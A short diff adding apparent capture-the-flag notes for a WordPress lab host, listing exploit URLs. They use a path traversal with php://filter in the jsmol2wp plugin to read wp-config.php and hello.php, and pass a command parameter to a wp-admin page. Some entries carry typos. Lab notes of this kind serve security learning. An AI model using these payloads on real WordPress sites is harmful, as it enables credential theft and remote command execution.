@@ -1,0 +1,16 @@
+after 4  http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+
+
+
+
+
+after 8    http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+
+
+after 12   http://www.smol.thm/wp-admin/indes.php?cmd=whoamif
+
+
+
+
+
+after 14  using wappalyzer extention we found MySQL database
